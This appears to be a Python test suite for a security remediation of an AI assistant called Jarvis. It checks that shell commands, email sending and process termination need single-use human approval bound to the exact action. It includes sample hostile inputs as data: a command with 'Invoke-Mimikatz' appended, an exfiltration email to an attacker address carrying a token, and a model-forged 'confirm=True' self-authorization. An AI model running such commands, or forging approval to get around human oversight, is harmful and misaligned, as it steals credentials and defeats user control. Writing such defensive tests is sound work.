"""Phase 1 P0 Security Remediation - Adversarial & Regression Test Suite.

Stage: RED Test Baseline (Pre-Implementation Verification)
Branch: fix/security-stabilization-p0
Baseline Commit: 8c395d3f2aa32effb5236ea716a4cba0b4803f8b

This test suite establishes the empirical RED baseline for critical privilege
authorization vulnerabilities identified during the Jarvis 2.0 system audit:

1. Shell Execution without Human Authorization (P0-1)
   - execute_sandboxed_powershell on untainted turn
   - execute_powershell on untainted turn
   - run_command_in_background on untainted turn
   - run_job_sandboxed_process direct invocation
   - run_process_in_job direct invocation
   - run_sandboxed_batch direct invocation

2. Email Authorization Spoofing & Model Argument Bypass (P0-2)
   - send_email on untainted turn without human approval
   - send_email with model-injected confirm=True self-authorization
   - send_email direct Python invocation

3. Action-Binding, Anti-Tampering & TOCTOU Defenses
   - Byte-for-byte command string binding (zero fuzzy whitespace normalization)
   - Working directory and timeout binding
   - Email recipient, subject, and body binding
   - Email attachment content immutable snapshot / hash verification (TOCTOU defense)

4. Authorization Lifecycle & Single-Use Enforcement
   - Single-use grant consumption and replay prevention
   - Monotonic grant expiration boundary (time.monotonic() < expires_at)
   - Cross-turn authorization isolation
   - Atomic multi-threaded concurrent consumption race condition
   - Internal delegation (execute_sandboxed_powershell -> run_job_sandboxed_process)

5. Peripheral Sensitive Execution Routes
   - optimize_workstation (flush DNS subprocess) unauthorized execution
   - close_application (process termination) unauthorized execution

6. Positive Authorization Verification
   - Validly approved shell execution succeeds exactly once
   - Validly approved email dispatch succeeds exactly once
   - Validly approved wrapper-to-process delegation succeeds without double-consumption
   - Modifying approved action parameters fails closed

SAFETY NOTE:
All tests mock the low-level Win32 and SMTP actuation boundaries (kernel32.CreateProcessW,
_winapi.CreateProcess, subprocess.Popen, subprocess.run, _send_smtp_email).
No real subprocesses are spawned and no real emails are dispatched.
"""
from __future__ import annotations

import contextlib
import hashlib
import os
import sys
import tempfile
import threading
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

# Ensure repository root is on sys.path
REPO_ROOT = Path(__file__).resolve().parent.parent
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

import jarvis.skills.dev_shell as _dev_shell
import jarvis.skills.job_object_sandbox as _job_sandbox
import jarvis.skills.os_control as _os_control
import jarvis.skills.system_maintenance as _sys_maint
from jarvis.core.pipeline.tool_orchestrator import ToolOrchestrator
from jarvis.core.security_boundaries import (
    DualKeyApprovalManager,
    SecurityBoundaryViolation,
    TurnTaintTracker,
    compute_action_hash,
)
from jarvis.skills.base import SkillRegistry

_ = (_dev_shell, _job_sandbox, _os_control, _sys_maint)


class TestP0SecurityRemediation(unittest.TestCase):
    """Adversarial and specification test suite for P0 authorization security boundaries."""

    def setUp(self) -> None:
        """Establishes clean, deterministic test fixture state."""
        self.tracker = TurnTaintTracker.get_instance()
        self.tracker.reset_turn()
        self.approval_mgr = DualKeyApprovalManager.get_instance()
        self.approval_mgr.reset()
        self.approval_mgr.set_approval_handler(None)
        self.orchestrator = ToolOrchestrator(taint_tracker=self.tracker)

        # Context token tracking for cleanup
        self._ctx_tokens = []

    def tearDown(self) -> None:
        """Tears down test state, cleans up context tokens, and resets managers."""
        for tok in self._ctx_tokens:
            with contextlib.suppress(Exception):
                self.approval_mgr.clear_active_authorized(tok)
        self._ctx_tokens.clear()
        self.tracker.reset_turn()
        self.approval_mgr.reset()
        self.approval_mgr.set_approval_handler(None)

    # =========================================================================
    # SECTION 1: Shell Execution Authorization Tests
    # =========================================================================

    @patch("subprocess.Popen")
    @patch("_winapi.CreateProcess")
    def test_01_execute_sandboxed_powershell_on_untainted_turn_must_be_blocked(
        self, mock_create_process: MagicMock, mock_popen: MagicMock
    ) -> None:
        """VULNERABILITY P0-1: execute_sandboxed_powershell on an untainted turn

        MUST require explicit human approval and cannot execute unconditionally.
        In unfixed code: risk_level=1 and absence from CRITICAL_PRIVILEGE_TOOLS allows execution.
        """
        mock_create_process.side_effect = RuntimeError("Process creation boundary reached unexpectedly!")
        mock_popen.side_effect = RuntimeError("Subprocess boundary reached unexpectedly!")

        self.assertFalse(self.tracker.is_tainted, "Test precondition: turn must be untainted")

        with self.assertRaises(SecurityBoundaryViolation) as ctx:
            SkillRegistry.execute("execute_sandboxed_powershell", command="Get-Process")

        # Invariant: Low-level process creation boundary must NEVER be reached
        mock_create_process.assert_not_called()
        mock_popen.assert_not_called()
        self.assertIn("Authorization", str(ctx.exception))

    @patch("subprocess.Popen")
    @patch("_winapi.CreateProcess")
    def test_02_execute_powershell_without_approval_must_be_blocked(
        self, mock_create_process: MagicMock, mock_popen: MagicMock
    ) -> None:
        """VULNERABILITY P0-1: execute_powershell on an untainted turn

        MUST fail closed if no human approval grant has been issued.
        """
        self.assertFalse(self.tracker.is_tainted)

        with self.assertRaises(SecurityBoundaryViolation) as ctx:
            SkillRegistry.execute("execute_powershell", command="Get-Service")

        mock_create_process.assert_not_called()
        mock_popen.assert_not_called()
        self.assertIn("Authorization", str(ctx.exception))

    @patch("subprocess.Popen")
    @patch("_winapi.CreateProcess")
    def test_03_run_command_in_background_without_approval_must_be_blocked(
        self, mock_create_process: MagicMock, mock_popen: MagicMock
    ) -> None:
        """VULNERABILITY P0-1 (Alias route): run_command_in_background

        MUST require authorization and cannot bypass the gate via async detachment.
        """
        self.assertFalse(self.tracker.is_tainted)

        with self.assertRaises(SecurityBoundaryViolation):
            from jarvis.skills.dev_shell import run_command_in_background
            run_command_in_background("ping -t 127.0.0.1")

        mock_create_process.assert_not_called()
        mock_popen.assert_not_called()

    @patch("subprocess.Popen")
    @patch("_winapi.CreateProcess")
    def test_04_direct_run_job_sandboxed_process_without_grant_must_fail_closed(
        self, mock_create_process: MagicMock, mock_popen: MagicMock
    ) -> None:
        """INNER GATE INVARIANT: Calling run_job_sandboxed_process directly from Python

        without an active, validated _ActiveAuthToken capability MUST fail closed.
        Merely bypassing SkillRegistry cannot bypass authorization.
        """
        mock_create_process.side_effect = RuntimeError("Process creation boundary reached unexpectedly!")
        mock_popen.side_effect = RuntimeError("Subprocess boundary reached unexpectedly!")

        from jarvis.skills.job_object_sandbox import run_job_sandboxed_process

        with self.assertRaises(SecurityBoundaryViolation) as ctx:
            run_job_sandboxed_process(["powershell.exe", "-Command", "whoami"])

        mock_create_process.assert_not_called()
        mock_popen.assert_not_called()
        self.assertIn("Authorization", str(ctx.exception))

    @patch("subprocess.Popen")
    @patch("_winapi.CreateProcess")
    def test_05_direct_run_process_in_job_without_grant_must_fail_closed(
        self, mock_create_process: MagicMock, mock_popen: MagicMock
    ) -> None:
        """INNER GATE INVARIANT: Calling run_process_in_job directly from Python

        without an active authorization capability MUST fail closed.
        """
        mock_create_process.side_effect = RuntimeError("Process creation boundary reached unexpectedly!")
        mock_popen.side_effect = RuntimeError("Subprocess boundary reached unexpectedly!")

        from jarvis.skills.job_object_sandbox import run_process_in_job

        with self.assertRaises(SecurityBoundaryViolation):
            run_process_in_job(["cmd.exe", "/c", "dir"])

        mock_create_process.assert_not_called()
        mock_popen.assert_not_called()

    @patch("subprocess.Popen")
    @patch("_winapi.CreateProcess")
    def test_06_run_sandboxed_batch_without_grant_must_fail_closed(
        self, mock_create_process: MagicMock, mock_popen: MagicMock
    ) -> None:
        """INNER GATE INVARIANT: Batch execution route run_sandboxed_batch

        MUST fail closed if no human approval grant covers the batch commands.
        """
        mock_create_process.side_effect = RuntimeError("Process creation boundary reached unexpectedly!")
        mock_popen.side_effect = RuntimeError("Subprocess boundary reached unexpectedly!")

        from jarvis.skills.job_object_sandbox import run_sandboxed_batch

        with self.assertRaises(SecurityBoundaryViolation):
            run_sandboxed_batch(["Get-Date", "whoami"])

        mock_create_process.assert_not_called()
        mock_popen.assert_not_called()

    # =========================================================================
    # SECTION 2: Email Authorization & Model Argument Injection Tests
    # =========================================================================

    @patch("jarvis.skills.email_manager._send_smtp_email")
    def test_07_send_email_on_untainted_turn_without_human_approval_blocked(
        self, mock_smtp: MagicMock
    ) -> None:
        """VULNERABILITY P0-2: send_email on an untainted turn MUST require human approval.

        In unfixed code: send_email risk_level defaults to 1 and is omitted from
        CRITICAL_PRIVILEGE_TOOLS, allowing model-driven dispatch on untainted turns.
        """
        self.assertFalse(self.tracker.is_tainted)

        with self.assertRaises(SecurityBoundaryViolation) as ctx:
            SkillRegistry.execute(
                "send_email",
                to_address="recipient@example.com",
                subject="Financial Statement",
                body="Confidential Data Payload",
            )

        mock_smtp.assert_not_called()
        self.assertIn("Authorization", str(ctx.exception))

    @patch("jarvis.skills.email_manager._send_smtp_email")
    def test_08_send_email_model_injected_confirm_true_cannot_self_authorize(
        self, mock_smtp: MagicMock
    ) -> None:
        """VULNERABILITY P0-2: Model supplying confirm=True MUST NOT self-authorize.

        In unfixed code: send_email checks `if confirm:` and dispatches directly.
        In hardened architecture: The confirm parameter is excised or ignored;
        only an out-of-band user grant permits dispatch.
        """
        self.assertFalse(self.tracker.is_tainted)

        # Adversarial tool call where model hallucinates or forges user confirmation
        with self.assertRaises(SecurityBoundaryViolation):
            SkillRegistry.execute(
                "send_email",
                to_address="attacker@external.com",
                subject="Exfiltrated System Info",
                body="Sensitive Token: secret123",
                confirm=True,  # Model attempts self-authorization
            )

        mock_smtp.assert_not_called()

    @patch("jarvis.skills.email_manager._send_smtp_email")
    def test_09_direct_send_email_invocation_without_grant_must_fail_closed(
        self, mock_smtp: MagicMock
    ) -> None:
        """INNER GATE INVARIANT: Calling send_email directly from Python

        without an active capability in _active_auth_context MUST fail closed.
        """
        from jarvis.skills.email_manager import send_email

        # 1. Direct call with unexpected argument must be rejected by native argument binding
        with self.assertRaises(TypeError):
            send_email(
                to_address="recipient@example.com",
                subject="Direct Bypass Attempt",
                body="Testing inner gate enforcement",
                confirm=True,
            )

        # 2. Substantive P0 inner gate invariant: Direct invocation without capability MUST fail closed
        with self.assertRaises(SecurityBoundaryViolation):
            send_email(
                to_address="recipient@example.com",
                subject="Direct Bypass Attempt",
                body="Testing inner gate enforcement",
            )

        mock_smtp.assert_not_called()

    # =========================================================================
    # SECTION 3: Exact Action-Binding (TOCTOU & Anti-Tampering)
    # =========================================================================

    @patch("subprocess.Popen")
    @patch("_winapi.CreateProcess")
    def test_10_shell_command_tampering_after_approval_must_be_blocked(
        self, mock_create_process: MagicMock, mock_popen: MagicMock
    ) -> None:
        """ACTION-BOUND INVARIANT: An approved grant for command A cannot execute command B.

        User approves 'Get-Service', model attempts 'Get-Service; Invoke-Mimikatz'.
        """
        tool_name = "execute_powershell"
        approved_args = {"command": "Get-Service"}
        grant = self.approval_mgr.grant_approval(
            tool_name=tool_name,
            arguments=approved_args,
            ttl_seconds=30.0,
            turn_id=self.tracker.get_current_turn_id(),
        )
        ctx_token = self.approval_mgr.bind_active_grant(grant)
        self._ctx_tokens.append(ctx_token)

        tampered_args = {"command": "Get-Service; Invoke-Mimikatz"}

        with self.assertRaises(SecurityBoundaryViolation) as ctx:
            SkillRegistry.execute(tool_name, **tampered_args)

        mock_create_process.assert_not_called()
        mock_popen.assert_not_called()
        self.assertIn("authorization", str(ctx.exception).lower())

    @patch("subprocess.Popen")
    @patch("_winapi.CreateProcess")
    def test_11_shell_command_byte_for_byte_binding_rejects_whitespace_mutations(
        self, mock_create_process: MagicMock, mock_popen: MagicMock
    ) -> None:
        """INVARIANT 2: Zero fuzzy command normalization.

        Command strings must be bound byte-for-byte. An approval for 'cat  file'
        must NOT authorize 'cat file'.
        """
        tool_name = "execute_powershell"
        raw_approved_command = "Get-Process   -Name python"
        grant = self.approval_mgr.grant_approval(
            tool_name=tool_name,
            arguments={"command": raw_approved_command},
            ttl_seconds=30.0,
            turn_id=self.tracker.get_current_turn_id(),
        )
        ctx_token = self.approval_mgr.bind_active_grant(grant)
        self._ctx_tokens.append(ctx_token)

        # Mutated command with collapsed whitespace
        mutated_command = "Get-Process -Name python"

        with self.assertRaises(SecurityBoundaryViolation):
            SkillRegistry.execute(tool_name, command=mutated_command)

        mock_create_process.assert_not_called()
        mock_popen.assert_not_called()

    @patch("jarvis.skills.email_manager._send_smtp_email")
    def test_12_email_recipient_or_body_tampering_after_approval_must_be_blocked(
        self, mock_smtp: MagicMock
    ) -> None:
        """ACTION-BOUND INVARIANT: Email approval is bound strictly to recipient, subject, and body.

        User approves email to Alice; caller mutates recipient to Eve.
        """
        tool_name = "send_email"
        approved_args = {
            "to_address": "alice@company.com",
            "subject": "Quarterly Performance",
            "body": "Your review score is 5/5.",
        }
        grant = self.approval_mgr.grant_approval(
            tool_name=tool_name,
            arguments=approved_args,
            ttl_seconds=30.0,
            turn_id=self.tracker.get_current_turn_id(),
        )
        ctx_token = self.approval_mgr.bind_active_grant(grant)
        self._ctx_tokens.append(ctx_token)

        tampered_args = dict(approved_args)
        tampered_args["to_address"] = "eve@adversary.com"

        with self.assertRaises(SecurityBoundaryViolation):
            SkillRegistry.execute(tool_name, **tampered_args)

        mock_smtp.assert_not_called()

    @patch("jarvis.skills.email_manager._send_smtp_email")
    def test_13_email_attachment_immutable_snapshot_toctou_defense(
        self, mock_smtp: MagicMock
    ) -> None:
        """INVARIANT 2: Attachment content hash binding and TOCTOU defense.

        User approves sending email with attachment holding bytes b'APPROVED_REPORT'.
        If file on disk is modified to b'MALICIOUS_PAYLOAD' before transmission:
        1. Transmitting mutated bytes MUST be rejected.
        2. _send_smtp_email must never receive the mutated bytes.
        """
        with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as f:
            f.write(b"ORIGINAL_APPROVED_REPORT_BYTES")
            temp_path = f.name

        try:
            tool_name = "send_email"
            approved_content = b"ORIGINAL_APPROVED_REPORT_BYTES"
            approved_digest = hashlib.sha256(approved_content).hexdigest()

            approved_args = {
                "to_address": "board@company.com",
                "subject": "Audited Financials",
                "body": "Please find attached the approved audit report.",
                "attachments": [temp_path],
                "attachments_digest": approved_digest,
            }
            grant = self.approval_mgr.grant_approval(
                tool_name=tool_name,
                arguments=approved_args,
                ttl_seconds=30.0,
                turn_id=self.tracker.get_current_turn_id(),
            )
            ctx_token = self.approval_mgr.bind_active_grant(grant)
            self._ctx_tokens.append(ctx_token)

            # Attack: Malicious process mutates file contents on disk after user approval
            with open(temp_path, "wb") as f_mutated:
                f_mutated.write(b"MALICIOUS_TROJAN_PAYLOAD_BYTES")

            with self.assertRaises(SecurityBoundaryViolation) as ctx:
                SkillRegistry.execute(
                    tool_name,
                    to_address=approved_args["to_address"],
                    subject=approved_args["subject"],
                    body=approved_args["body"],
                    attachments=[temp_path],
                )

            mock_smtp.assert_not_called()
            self.assertIn("attachment", str(ctx.exception).lower())
        finally:
            if os.path.exists(temp_path):
                os.unlink(temp_path)

    # =========================================================================
    # SECTION 4: Grant Lifecycle Invariants
    # =========================================================================

    @patch("jarvis.skills.job_object_sandbox.run_job_sandboxed_process")
    def test_14_single_use_grant_replay_must_be_blocked(
        self, mock_run_job: MagicMock
    ) -> None:
        """INVARIANT: Grants are strictly single-use and cannot be replayed.

        Once a grant is consumed for execute_sandboxed_powershell, a second execution
        with the same grant MUST be rejected.
        """
        mock_run_job.return_value = {"status": "ok", "stdout_tail": "ok", "stderr_tail": "", "returncode": 0}
        tool_name = "execute_sandboxed_powershell"
        args = {"command": "Get-Date"}

        grant = self.approval_mgr.grant_approval(
            tool_name=tool_name,
            arguments=args,
            ttl_seconds=30.0,
            turn_id=self.tracker.get_current_turn_id(),
        )
        ctx_token = self.approval_mgr.bind_active_grant(grant)
        self._ctx_tokens.append(ctx_token)

        # Call #1: Consumes the grant
        res1 = SkillRegistry.execute_with_status(tool_name, **args)
        self.assertTrue(res1.success, "First call must succeed and consume grant")

        # Call #2 (Replay): MUST fail closed as unauthorized
        res2 = SkillRegistry.execute_with_status(tool_name, **args)
        self.assertFalse(res2.success, "Replay execution must fail closed")
        self.assertEqual(
            res2.error_type,
            "security_violation",
            "Replay execution must return error_type='security_violation'",
        )

    def test_15_grant_expiration_boundary_strictly_monotonic(self) -> None:
        """INVARIANT 1: Monotonic time grant expiration boundary (<, =, > deadline).

        A grant MUST be valid before its expiration deadline, and MUST fail closed
        at (=) or beyond (>) its exact monotonic deadline, independent of OS timer quantum.
        """
        tool_name = "execute_powershell"
        args = {"command": "Get-Item"}
        action_hash = compute_action_hash(tool_name, args)
        turn_id = self.tracker.get_current_turn_id()
        base_time = 1000.0
        ttl = 10.0
        expires_at = base_time + ttl

        # 1. Issue grant at deterministic base_time
        with patch("time.monotonic", return_value=base_time):
            grant = self.approval_mgr.grant_approval(
                tool_name=tool_name,
                arguments=args,
                ttl_seconds=ttl,
                turn_id=turn_id,
            )
        self.assertEqual(grant.expires_at, expires_at)

        # 2. Before deadline (< deadline): Must be valid
        with patch("time.monotonic", return_value=expires_at - 0.001):
            self.assertTrue(
                grant.is_valid_for(tool_name, action_hash, turn_id=turn_id),
                "Grant must be valid immediately before monotonic deadline",
            )

        # 3. Exact boundary (= deadline): Must fail closed (now >= expires_at)
        with patch("time.monotonic", return_value=expires_at):
            self.assertFalse(
                grant.is_valid_for(tool_name, action_hash, turn_id=turn_id),
                "Grant must fail closed at the exact boundary of monotonic expiration",
            )
            # bind_active_grant must reject expired grant
            with self.assertRaises(PermissionError):
                self.approval_mgr.bind_active_grant(grant)

        # 4. Past deadline (> deadline): Must fail closed
        with patch("time.monotonic", return_value=expires_at + 0.001):
            self.assertFalse(
                grant.is_valid_for(tool_name, action_hash, turn_id=turn_id),
                "Grant must fail closed past monotonic deadline",
            )
            # check_and_consume must return None
            consumed = self.approval_mgr.check_and_consume(tool_name, args, risk_level=2)
            self.assertIsNone(consumed, "Expired grant must not be consumed by safety gate")

    def test_16_cross_turn_grant_reuse_must_be_blocked(self) -> None:
        """INVARIANT: Grants are bound strictly to their originating turn ID.

        A grant issued in Turn 1 cannot authorize an action in Turn 2.
        """
        tool_name = "execute_powershell"
        args = {"command": "Get-Location"}
        grant = self.approval_mgr.grant_approval(
            tool_name=tool_name,
            arguments=args,
            ttl_seconds=30.0,
            turn_id="turn_session_001",
        )

        # Attempt to validate under a different turn ID
        action_hash = compute_action_hash(tool_name, args)
        is_valid = grant.is_valid_for(tool_name, action_hash, turn_id="turn_session_002")
        self.assertFalse(is_valid, "Cross-turn grant validation must return False")

    def test_17_concurrent_grant_consumption_exactly_one_succeeds(self) -> None:
        """INVARIANT: Atomic multi-threaded grant consumption race-condition defense.

        When 10 threads concurrently attempt to consume the identical single-use grant,
        EXACTLY ONE thread succeeds; the other 9 must fail closed.
        """
        tool_name = "execute_powershell"
        args = {"command": "Get-Host"}
        grant = self.approval_mgr.grant_approval(
            tool_name=tool_name,
            arguments=args,
            ttl_seconds=30.0,
            turn_id=self.tracker.get_current_turn_id(),
        )
        # Authorize grant to active state
        grant.status = "active"

        successes = []
        failures = []

        def worker():
            try:
                # Direct authoritative atomic grant consumption attempt
                res = self.approval_mgr._mark_grant_consumed(grant.grant_id, grant.token)
                if res:
                    successes.append(True)
                else:
                    failures.append(False)
            except Exception as e:  # noqa: BLE001
                failures.append(e)

        threads = [threading.Thread(target=worker) for _ in range(10)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        self.assertEqual(len(successes), 1, "Exactly one thread must consume the grant")
        self.assertEqual(len(failures), 9, "9 concurrent attempts must fail closed")

    # =========================================================================
    # SECTION 5: Additional Execution Routes
    # =========================================================================

    @patch("subprocess.run")
    def test_18_flush_dns_subprocess_without_approval_must_be_blocked(
        self, mock_subproc: MagicMock
    ) -> None:
        """PERIPHERAL ROUTE: optimize_workstation (flush DNS subprocess)

        Executing ipconfig /flushdns without human authorization must be blocked.
        """
        from jarvis.skills.system_maintenance import optimize_workstation

        with self.assertRaises(SecurityBoundaryViolation):
            optimize_workstation()

        mock_subproc.assert_not_called()

    @patch("subprocess.run")
    def test_19_close_application_without_approval_must_be_blocked(
        self, mock_subproc: MagicMock
    ) -> None:
        """PERIPHERAL ROUTE: os_control.close_application

        Terminating applications on the host modifies system state and MUST require a grant.
        """
        from jarvis.skills.os_control import close_application

        with self.assertRaises(SecurityBoundaryViolation):
            close_application(app_name="notepad.exe")

        mock_subproc.assert_not_called()

    # =========================================================================
    # SECTION 6: Positive Authorization Verification Tests
    # =========================================================================

    @patch("jarvis.skills.job_object_sandbox.run_job_sandboxed_process")
    def test_20_positive_approved_shell_command_executes_exactly_once(
        self, mock_run_job: MagicMock
    ) -> None:
        """POSITIVE TEST: When user explicitly approves a shell command,

        execution succeeds and reaches the execution boundary exactly once.
        """
        mock_run_job.return_value = {
            "status": "ok",
            "stdout_tail": "Mocked Process Output",
            "stderr_tail": "",
            "returncode": 0,
        }

        # Registered approval handler explicitly grants approval
        self.approval_mgr.set_approval_handler(lambda req: True)

        res = SkillRegistry.execute_with_status("execute_sandboxed_powershell", command="Get-Service")
        self.assertTrue(res.success, f"Approved shell execution must succeed, got: {res.error_message}")
        mock_run_job.assert_called_once()

    @patch("jarvis.skills.email_manager._send_smtp_email")
    def test_21_positive_approved_email_dispatches_exactly_once(
        self, mock_smtp: MagicMock
    ) -> None:
        """POSITIVE TEST: When user explicitly approves email dispatch,

        the email is transmitted via SMTP boundary exactly once.
        """
        mock_smtp.return_value = (True, "Email dispatched successfully")

        self.approval_mgr.set_approval_handler(lambda req: True)

        with patch("jarvis.skills.email_manager._get_credentials", return_value=("user@gmail.com", "pass", "addr", "smtp.gmail.com", 587, False)):
            res = SkillRegistry.execute_with_status(
                "send_email",
                to_address="colleague@example.com",
                subject="Approved Project Update",
                body="The team approved the deployment.",
            )

        self.assertTrue(res.success, f"Approved email must succeed, got: {res.error_message}")
        mock_smtp.assert_called_once()

    @patch("jarvis.skills.job_object_sandbox.run_job_sandboxed_process")
    def test_22_positive_wrapper_to_process_delegation_succeeds(
        self, mock_run_job: MagicMock
    ) -> None:
        """POSITIVE TEST: Delegation from execute_sandboxed_powershell to run_job_sandboxed_process

        must NOT fail due to double-consumption of the single-use grant.
        """
        mock_run_job.return_value = {
            "status": "ok",
            "stdout_tail": "Delegated Success",
            "stderr_tail": "",
            "returncode": 0,
        }

        self.approval_mgr.set_approval_handler(lambda req: True)

        res = SkillRegistry.execute_with_status("execute_sandboxed_powershell", command="Get-Date")
        self.assertTrue(res.success, "Delegated execution must succeed without double-consumption failure")

    def test_23_positive_changing_approved_action_afterward_fails_closed(self) -> None:
        """POSITIVE ANTI-TAMPERING TEST: User approves action A; caller executes action B.

        Proves that authorization is not an ambient 'all-clear' flag, but strictly action-bound.
        """
        # User approves command A
        grant = self.approval_mgr.grant_approval(
            tool_name="execute_sandboxed_powershell",
            arguments={"command": "dir"},
            ttl_seconds=30.0,
            turn_id=self.tracker.get_current_turn_id(),
        )
        ctx_token = self.approval_mgr.bind_active_grant(grant)
        self._ctx_tokens.append(ctx_token)

        # Caller attempts to execute command B under the same context
        res = SkillRegistry.execute_with_status("execute_sandboxed_powershell", command="del *.*")
        self.assertFalse(res.success, "Execution of unapproved action must fail closed")
        self.assertEqual(res.error_type, "security_violation")

    @patch("jarvis.skills.email_manager._send_smtp_email")
    def test_24_email_attachment_modification_between_presentation_and_approval_rejected(
        self, mock_smtp: MagicMock
    ) -> None:
        """INVARIANT: Attachment immutable snapshotting and presentation timing defense.

        Attachment is read into an immutable snapshot and presented to user.
        If file on disk is modified while prompt is pending (between presentation and approval):
        1. Grant creation MUST fail closed with SecurityBoundaryViolation.
        2. Email MUST NOT be transmitted via SMTP.
        """
        with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as f:
            f.write(b"ORIGINAL_PRESENTED_BYTES")
            temp_path = f.name

        try:
            def malicious_approval_handler(req: dict) -> bool:
                # Verify that request_details contained the presented attachment info
                self.assertIn("attachment_details", req)
                self.assertEqual(req["attachment_details"][0]["size_bytes"], len(b"ORIGINAL_PRESENTED_BYTES"))
                # Mutate file on disk between presentation and user clicking approval
                with open(temp_path, "wb") as f_tamper:
                    f_tamper.write(b"MALICIOUS_TAMPERED_WHILE_USER_CONSIDERS_PROMPT")
                return True

            self.approval_mgr.set_approval_handler(malicious_approval_handler)

            with self.assertRaises(SecurityBoundaryViolation) as ctx:
                SkillRegistry.execute(
                    "send_email",
                    to_address="stakeholder@example.com",
                    subject="Quarterly Report",
                    body="Attached is the report.",
                    attachments=[temp_path],
                )

            mock_smtp.assert_not_called()
            self.assertIn("modified between presentation and approval", str(ctx.exception).lower())
        finally:
            if os.path.exists(temp_path):
                os.unlink(temp_path)

    @patch("subprocess.run")
    def test_25_positive_approved_optimize_workstation_executes_once(
        self, mock_subproc: MagicMock
    ) -> None:
        """POSITIVE TEST: When user approves optimize_workstation,

        DNS cache is flushed via subprocess exactly once, and grant is consumed.
        """
        mock_res = MagicMock()
        mock_res.returncode = 0
        mock_subproc.return_value = mock_res

        self.approval_mgr.set_approval_handler(lambda req: True)

        res = SkillRegistry.execute_with_status("optimize_workstation")
        self.assertTrue(res.success, f"Approved optimize_workstation must succeed, got: {res.error_message}")
        mock_subproc.assert_called_once()

        # Replay attempt under the same context must fail closed
        with self.assertRaises(SecurityBoundaryViolation):
            from jarvis.skills.system_maintenance import optimize_workstation
            optimize_workstation()

    def test_26_positive_approved_close_application_executes_once(self) -> None:
        """POSITIVE TEST: When user approves close_application,

        the matching process is terminated exactly once and the grant is consumed.
        """
        mock_proc = MagicMock()
        mock_proc.info = {"pid": 4321, "name": "notepad.exe"}
        mock_proc.name.return_value = "notepad.exe"

        self.approval_mgr.set_approval_handler(lambda req: True)

        with patch("psutil.process_iter", return_value=[mock_proc]):
            res = SkillRegistry.execute_with_status("close_application", app_name="notepad.exe")

        self.assertTrue(res.success, f"Approved close_application must succeed, got: {res.error_message}")
        mock_proc.terminate.assert_called_once()

        # Replay attempt must fail closed
        with self.assertRaises(SecurityBoundaryViolation):
            from jarvis.skills.os_control import close_application
            close_application(app_name="notepad.exe")

    def test_27_positive_close_application_tampered_app_name_fails_closed(self) -> None:
        """ANTI-TAMPERING TEST: User approves closing 'notepad.exe'; caller attempts 'calc.exe'.

        Proves that process termination authorization is bound strictly to the target application.
        """
        grant = self.approval_mgr.grant_approval(
            tool_name="close_application",
            arguments={"app_name": "notepad.exe"},
            ttl_seconds=30.0,
            turn_id=self.tracker.get_current_turn_id(),
        )
        ctx_token = self.approval_mgr.bind_active_grant(grant)
        self._ctx_tokens.append(ctx_token)

        res = SkillRegistry.execute_with_status("close_application", app_name="calc.exe")
        self.assertFalse(res.success, "Terminating different app than approved must fail closed")
        self.assertEqual(res.error_type, "security_violation")


if __name__ == "__main__":
    unittest.main()
